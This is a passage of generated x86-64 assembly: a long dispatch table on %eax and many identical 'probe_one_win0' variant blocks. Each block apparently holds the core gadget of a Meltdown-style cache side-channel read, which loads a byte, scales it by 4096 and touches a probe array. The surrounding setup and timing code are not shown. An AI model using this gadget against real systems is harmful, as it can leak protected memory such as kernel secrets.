	je	.Lprobe_one_win0_var2288
	cmpl	$2289, %eax
	je	.Lprobe_one_win0_var2289
	cmpl	$2290, %eax
	je	.Lprobe_one_win0_var2290
	cmpl	$2291, %eax
	je	.Lprobe_one_win0_var2291
	cmpl	$2292, %eax
	je	.Lprobe_one_win0_var2292
	cmpl	$2293, %eax
	je	.Lprobe_one_win0_var2293
	cmpl	$2294, %eax
	je	.Lprobe_one_win0_var2294
	cmpl	$2295, %eax
	je	.Lprobe_one_win0_var2295
	cmpl	$2296, %eax
	je	.Lprobe_one_win0_var2296
	cmpl	$2297, %eax
	je	.Lprobe_one_win0_var2297
	cmpl	$2298, %eax
	je	.Lprobe_one_win0_var2298
	cmpl	$2299, %eax
	je	.Lprobe_one_win0_var2299
	cmpl	$2300, %eax
	je	.Lprobe_one_win0_var2300
	cmpl	$2301, %eax
	je	.Lprobe_one_win0_var2301
	cmpl	$2302, %eax
	je	.Lprobe_one_win0_var2302
	cmpl	$2303, %eax
	je	.Lprobe_one_win0_var2303
	cmpl	$2304, %eax
	je	.Lprobe_one_win0_var2304
	cmpl	$2305, %eax
	je	.Lprobe_one_win0_var2305
	cmpl	$2306, %eax
	je	.Lprobe_one_win0_var2306
	cmpl	$2307, %eax
	je	.Lprobe_one_win0_var2307
	cmpl	$2308, %eax
	je	.Lprobe_one_win0_var2308
	cmpl	$2309, %eax
	je	.Lprobe_one_win0_var2309
	cmpl	$2310, %eax
	je	.Lprobe_one_win0_var2310
	cmpl	$2311, %eax
	je	.Lprobe_one_win0_var2311
	cmpl	$2312, %eax
	je	.Lprobe_one_win0_var2312
	cmpl	$2313, %eax
	je	.Lprobe_one_win0_var2313
	cmpl	$2314, %eax
	je	.Lprobe_one_win0_var2314
	cmpl	$2315, %eax
	je	.Lprobe_one_win0_var2315
	cmpl	$2316, %eax
	je	.Lprobe_one_win0_var2316
	cmpl	$2317, %eax
	je	.Lprobe_one_win0_var2317
	cmpl	$2318, %eax
	je	.Lprobe_one_win0_var2318
	cmpl	$2319, %eax
	je	.Lprobe_one_win0_var2319
	cmpl	$2320, %eax
	je	.Lprobe_one_win0_var2320
	cmpl	$2321, %eax
	je	.Lprobe_one_win0_var2321
	cmpl	$2322, %eax
	je	.Lprobe_one_win0_var2322
	cmpl	$2323, %eax
	je	.Lprobe_one_win0_var2323
	cmpl	$2324, %eax
	je	.Lprobe_one_win0_var2324
	cmpl	$2325, %eax
	je	.Lprobe_one_win0_var2325
	cmpl	$2326, %eax
	je	.Lprobe_one_win0_var2326
	cmpl	$2327, %eax
	je	.Lprobe_one_win0_var2327
	cmpl	$2328, %eax
	je	.Lprobe_one_win0_var2328
	cmpl	$2329, %eax
	je	.Lprobe_one_win0_var2329
	cmpl	$2330, %eax
	je	.Lprobe_one_win0_var2330
	cmpl	$2331, %eax
	je	.Lprobe_one_win0_var2331
	cmpl	$2332, %eax
	je	.Lprobe_one_win0_var2332
	cmpl	$2333, %eax
	je	.Lprobe_one_win0_var2333
	cmpl	$2334, %eax
	je	.Lprobe_one_win0_var2334
	cmpl	$2335, %eax
	je	.Lprobe_one_win0_var2335
	cmpl	$2336, %eax
	je	.Lprobe_one_win0_var2336
	cmpl	$2337, %eax
	je	.Lprobe_one_win0_var2337
	cmpl	$2338, %eax
	je	.Lprobe_one_win0_var2338
	cmpl	$2339, %eax
	je	.Lprobe_one_win0_var2339
	cmpl	$2340, %eax
	je	.Lprobe_one_win0_var2340
	cmpl	$2341, %eax
	je	.Lprobe_one_win0_var2341
	cmpl	$2342, %eax
	je	.Lprobe_one_win0_var2342
	cmpl	$2343, %eax
	je	.Lprobe_one_win0_var2343
	cmpl	$2344, %eax
	je	.Lprobe_one_win0_var2344
	cmpl	$2345, %eax
	je	.Lprobe_one_win0_var2345
	cmpl	$2346, %eax
	je	.Lprobe_one_win0_var2346
	cmpl	$2347, %eax
	je	.Lprobe_one_win0_var2347
	cmpl	$2348, %eax
	je	.Lprobe_one_win0_var2348
	cmpl	$2349, %eax
	je	.Lprobe_one_win0_var2349
	cmpl	$2350, %eax
	je	.Lprobe_one_win0_var2350
	cmpl	$2351, %eax
	je	.Lprobe_one_win0_var2351
	cmpl	$2352, %eax
	je	.Lprobe_one_win0_var2352
	cmpl	$2353, %eax
	je	.Lprobe_one_win0_var2353
	cmpl	$2354, %eax
	je	.Lprobe_one_win0_var2354
	cmpl	$2355, %eax
	je	.Lprobe_one_win0_var2355
	cmpl	$2356, %eax
	je	.Lprobe_one_win0_var2356
	cmpl	$2357, %eax
	je	.Lprobe_one_win0_var2357
	cmpl	$2358, %eax
	je	.Lprobe_one_win0_var2358
	cmpl	$2359, %eax
	je	.Lprobe_one_win0_var2359
	cmpl	$2360, %eax
	je	.Lprobe_one_win0_var2360
	cmpl	$2361, %eax
	je	.Lprobe_one_win0_var2361
	cmpl	$2362, %eax
	je	.Lprobe_one_win0_var2362
	cmpl	$2363, %eax
	je	.Lprobe_one_win0_var2363
	cmpl	$2364, %eax
	je	.Lprobe_one_win0_var2364
	cmpl	$2365, %eax
	je	.Lprobe_one_win0_var2365
	cmpl	$2366, %eax
	je	.Lprobe_one_win0_var2366
	cmpl	$2367, %eax
	je	.Lprobe_one_win0_var2367
	cmpl	$2368, %eax
	je	.Lprobe_one_win0_var2368
	cmpl	$2369, %eax
	je	.Lprobe_one_win0_var2369
	cmpl	$2370, %eax
	je	.Lprobe_one_win0_var2370
	cmpl	$2371, %eax
	je	.Lprobe_one_win0_var2371
	cmpl	$2372, %eax
	je	.Lprobe_one_win0_var2372
	cmpl	$2373, %eax
	je	.Lprobe_one_win0_var2373
	cmpl	$2374, %eax
	je	.Lprobe_one_win0_var2374
	cmpl	$2375, %eax
	je	.Lprobe_one_win0_var2375
	cmpl	$2376, %eax
	je	.Lprobe_one_win0_var2376
	cmpl	$2377, %eax
	je	.Lprobe_one_win0_var2377
	cmpl	$2378, %eax
	je	.Lprobe_one_win0_var2378
	cmpl	$2379, %eax
	je	.Lprobe_one_win0_var2379
	cmpl	$2380, %eax
	je	.Lprobe_one_win0_var2380
	cmpl	$2381, %eax
	je	.Lprobe_one_win0_var2381
	cmpl	$2382, %eax
	je	.Lprobe_one_win0_var2382
	cmpl	$2383, %eax
	je	.Lprobe_one_win0_var2383
	cmpl	$2384, %eax
	je	.Lprobe_one_win0_var2384
	cmpl	$2385, %eax
	je	.Lprobe_one_win0_var2385
	cmpl	$2386, %eax
	je	.Lprobe_one_win0_var2386
	cmpl	$2387, %eax
	je	.Lprobe_one_win0_var2387
	cmpl	$2388, %eax
	je	.Lprobe_one_win0_var2388
	cmpl	$2389, %eax
	je	.Lprobe_one_win0_var2389
	cmpl	$2390, %eax
	je	.Lprobe_one_win0_var2390
	cmpl	$2391, %eax
	je	.Lprobe_one_win0_var2391
	cmpl	$2392, %eax
	je	.Lprobe_one_win0_var2392
	cmpl	$2393, %eax
	je	.Lprobe_one_win0_var2393
	cmpl	$2394, %eax
	je	.Lprobe_one_win0_var2394
	cmpl	$2395, %eax
	je	.Lprobe_one_win0_var2395
	cmpl	$2396, %eax
	je	.Lprobe_one_win0_var2396
	cmpl	$2397, %eax
	je	.Lprobe_one_win0_var2397
	cmpl	$2398, %eax
	je	.Lprobe_one_win0_var2398
	cmpl	$2399, %eax
	je	.Lprobe_one_win0_var2399
	cmpl	$2400, %eax
	je	.Lprobe_one_win0_var2400
	cmpl	$2401, %eax
	je	.Lprobe_one_win0_var2401
	cmpl	$2402, %eax
	je	.Lprobe_one_win0_var2402
	cmpl	$2403, %eax
	je	.Lprobe_one_win0_var2403
	cmpl	$2404, %eax
	je	.Lprobe_one_win0_var2404
	cmpl	$2405, %eax
	je	.Lprobe_one_win0_var2405
	cmpl	$2406, %eax
	je	.Lprobe_one_win0_var2406
	cmpl	$2407, %eax
	je	.Lprobe_one_win0_var2407
	cmpl	$2408, %eax
	je	.Lprobe_one_win0_var2408
	cmpl	$2409, %eax
	je	.Lprobe_one_win0_var2409
	cmpl	$2410, %eax
	je	.Lprobe_one_win0_var2410
	cmpl	$2411, %eax
	je	.Lprobe_one_win0_var2411
	cmpl	$2412, %eax
	je	.Lprobe_one_win0_var2412
	cmpl	$2413, %eax
	je	.Lprobe_one_win0_var2413
	cmpl	$2414, %eax
	je	.Lprobe_one_win0_var2414
	cmpl	$2415, %eax
	je	.Lprobe_one_win0_var2415
	cmpl	$2416, %eax
	je	.Lprobe_one_win0_var2416
	cmpl	$2417, %eax
	je	.Lprobe_one_win0_var2417
	cmpl	$2418, %eax
	je	.Lprobe_one_win0_var2418
	cmpl	$2419, %eax
	je	.Lprobe_one_win0_var2419
	cmpl	$2420, %eax
	je	.Lprobe_one_win0_var2420
	cmpl	$2421, %eax
	je	.Lprobe_one_win0_var2421
	cmpl	$2422, %eax
	je	.Lprobe_one_win0_var2422
	cmpl	$2423, %eax
	je	.Lprobe_one_win0_var2423
	cmpl	$2424, %eax
	je	.Lprobe_one_win0_var2424
	cmpl	$2425, %eax
	je	.Lprobe_one_win0_var2425
	cmpl	$2426, %eax
	je	.Lprobe_one_win0_var2426
	cmpl	$2427, %eax
	je	.Lprobe_one_win0_var2427
	cmpl	$2428, %eax
	je	.Lprobe_one_win0_var2428
	cmpl	$2429, %eax
	je	.Lprobe_one_win0_var2429
	cmpl	$2430, %eax
	je	.Lprobe_one_win0_var2430
	cmpl	$2431, %eax
	je	.Lprobe_one_win0_var2431
	cmpl	$2432, %eax
	je	.Lprobe_one_win0_var2432
	cmpl	$2433, %eax
	je	.Lprobe_one_win0_var2433
	cmpl	$2434, %eax
	je	.Lprobe_one_win0_var2434
	cmpl	$2435, %eax
	je	.Lprobe_one_win0_var2435
	cmpl	$2436, %eax
	je	.Lprobe_one_win0_var2436
	cmpl	$2437, %eax
	je	.Lprobe_one_win0_var2437
	cmpl	$2438, %eax
	je	.Lprobe_one_win0_var2438
	cmpl	$2439, %eax
	je	.Lprobe_one_win0_var2439
	cmpl	$2440, %eax
	je	.Lprobe_one_win0_var2440
	cmpl	$2441, %eax
	je	.Lprobe_one_win0_var2441
	cmpl	$2442, %eax
	je	.Lprobe_one_win0_var2442
	cmpl	$2443, %eax
	je	.Lprobe_one_win0_var2443
	cmpl	$2444, %eax
	je	.Lprobe_one_win0_var2444
	cmpl	$2445, %eax
	je	.Lprobe_one_win0_var2445
	cmpl	$2446, %eax
	je	.Lprobe_one_win0_var2446
	cmpl	$2447, %eax
	je	.Lprobe_one_win0_var2447
	cmpl	$2448, %eax
	je	.Lprobe_one_win0_var2448
	cmpl	$2449, %eax
	je	.Lprobe_one_win0_var2449
	cmpl	$2450, %eax
	je	.Lprobe_one_win0_var2450
	cmpl	$2451, %eax
	je	.Lprobe_one_win0_var2451
	cmpl	$2452, %eax
	je	.Lprobe_one_win0_var2452
	cmpl	$2453, %eax
	je	.Lprobe_one_win0_var2453
	cmpl	$2454, %eax
	je	.Lprobe_one_win0_var2454
	cmpl	$2455, %eax
	je	.Lprobe_one_win0_var2455
	cmpl	$2456, %eax
	je	.Lprobe_one_win0_var2456
	cmpl	$2457, %eax
	je	.Lprobe_one_win0_var2457
	cmpl	$2458, %eax
	je	.Lprobe_one_win0_var2458
	cmpl	$2459, %eax
	je	.Lprobe_one_win0_var2459
	cmpl	$2460, %eax
	je	.Lprobe_one_win0_var2460
	cmpl	$2461, %eax
	je	.Lprobe_one_win0_var2461
	cmpl	$2462, %eax
	je	.Lprobe_one_win0_var2462
	cmpl	$2463, %eax
	je	.Lprobe_one_win0_var2463
	cmpl	$2464, %eax
	je	.Lprobe_one_win0_var2464
	cmpl	$2465, %eax
	je	.Lprobe_one_win0_var2465
	cmpl	$2466, %eax
	je	.Lprobe_one_win0_var2466
	cmpl	$2467, %eax
	je	.Lprobe_one_win0_var2467
	cmpl	$2468, %eax
	je	.Lprobe_one_win0_var2468
	cmpl	$2469, %eax
	je	.Lprobe_one_win0_var2469
	cmpl	$2470, %eax
	je	.Lprobe_one_win0_var2470
	cmpl	$2471, %eax
	je	.Lprobe_one_win0_var2471
	cmpl	$2472, %eax
	je	.Lprobe_one_win0_var2472
	cmpl	$2473, %eax
	je	.Lprobe_one_win0_var2473
	cmpl	$2474, %eax
	je	.Lprobe_one_win0_var2474
	cmpl	$2475, %eax
	je	.Lprobe_one_win0_var2475
	cmpl	$2476, %eax
	je	.Lprobe_one_win0_var2476
	cmpl	$2477, %eax
	je	.Lprobe_one_win0_var2477
	cmpl	$2478, %eax
	je	.Lprobe_one_win0_var2478
	cmpl	$2479, %eax
	je	.Lprobe_one_win0_var2479
	cmpl	$2480, %eax
	je	.Lprobe_one_win0_var2480
	cmpl	$2481, %eax
	je	.Lprobe_one_win0_var2481
	cmpl	$2482, %eax
	je	.Lprobe_one_win0_var2482
	cmpl	$2483, %eax
	je	.Lprobe_one_win0_var2483
	cmpl	$2484, %eax
	je	.Lprobe_one_win0_var2484
	cmpl	$2485, %eax
	je	.Lprobe_one_win0_var2485
	cmpl	$2486, %eax
	je	.Lprobe_one_win0_var2486
	cmpl	$2487, %eax
	je	.Lprobe_one_win0_var2487
	cmpl	$2488, %eax
	je	.Lprobe_one_win0_var2488
	cmpl	$2489, %eax
	je	.Lprobe_one_win0_var2489
	cmpl	$2490, %eax
	je	.Lprobe_one_win0_var2490
	cmpl	$2491, %eax
	je	.Lprobe_one_win0_var2491
	cmpl	$2492, %eax
	je	.Lprobe_one_win0_var2492
	cmpl	$2493, %eax
	je	.Lprobe_one_win0_var2493
	cmpl	$2494, %eax
	je	.Lprobe_one_win0_var2494
	cmpl	$2495, %eax
	je	.Lprobe_one_win0_var2495
	cmpl	$2496, %eax
	je	.Lprobe_one_win0_var2496
	cmpl	$2497, %eax
	je	.Lprobe_one_win0_var2497
	cmpl	$2498, %eax
	je	.Lprobe_one_win0_var2498
	cmpl	$2499, %eax
	je	.Lprobe_one_win0_var2499
	jmp	.Lprobe_one_win0_var0
## Variant 0
.Lprobe_one_win0_var0:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 1
.Lprobe_one_win0_var1:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 2
.Lprobe_one_win0_var2:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 3
.Lprobe_one_win0_var3:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 4
.Lprobe_one_win0_var4:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 5
.Lprobe_one_win0_var5:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 6
.Lprobe_one_win0_var6:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 7
.Lprobe_one_win0_var7:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 8
.Lprobe_one_win0_var8:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 9
.Lprobe_one_win0_var9:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 10
.Lprobe_one_win0_var10:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 11
.Lprobe_one_win0_var11:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 12
.Lprobe_one_win0_var12:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 13
.Lprobe_one_win0_var13:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 14
.Lprobe_one_win0_var14:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 15
.Lprobe_one_win0_var15:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 16
.Lprobe_one_win0_var16:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 17
.Lprobe_one_win0_var17:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 18
.Lprobe_one_win0_var18:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 19
.Lprobe_one_win0_var19:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 20
.Lprobe_one_win0_var20:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 21
.Lprobe_one_win0_var21:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 22
.Lprobe_one_win0_var22:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 23
.Lprobe_one_win0_var23:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 24
.Lprobe_one_win0_var24:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 25
.Lprobe_one_win0_var25:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 26
.Lprobe_one_win0_var26:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 27
.Lprobe_one_win0_var27:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 28
.Lprobe_one_win0_var28:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 29
.Lprobe_one_win0_var29:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 30
.Lprobe_one_win0_var30:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 31
.Lprobe_one_win0_var31:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 32
.Lprobe_one_win0_var32:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 33
.Lprobe_one_win0_var33:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 34
.Lprobe_one_win0_var34:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 35
.Lprobe_one_win0_var35:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 36
.Lprobe_one_win0_var36:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 37
.Lprobe_one_win0_var37:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 38
.Lprobe_one_win0_var38:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 39
.Lprobe_one_win0_var39:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 40
.Lprobe_one_win0_var40:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 41
.Lprobe_one_win0_var41:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 42
.Lprobe_one_win0_var42:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 43
.Lprobe_one_win0_var43:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 44
.Lprobe_one_win0_var44:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 45
.Lprobe_one_win0_var45:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 46
.Lprobe_one_win0_var46:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 47
.Lprobe_one_win0_var47:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 48
.Lprobe_one_win0_var48:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 49
.Lprobe_one_win0_var49:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 50
.Lprobe_one_win0_var50:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 51
.Lprobe_one_win0_var51:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 52
.Lprobe_one_win0_var52:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 53
.Lprobe_one_win0_var53:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 54
.Lprobe_one_win0_var54:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 55
.Lprobe_one_win0_var55:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 56
.Lprobe_one_win0_var56:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 57
.Lprobe_one_win0_var57:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 58
.Lprobe_one_win0_var58:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 59
.Lprobe_one_win0_var59:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 60
.Lprobe_one_win0_var60:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 61
.Lprobe_one_win0_var61:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 62
.Lprobe_one_win0_var62:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 63
.Lprobe_one_win0_var63:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 64
.Lprobe_one_win0_var64:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 65
.Lprobe_one_win0_var65:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 66
.Lprobe_one_win0_var66:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 67
.Lprobe_one_win0_var67:
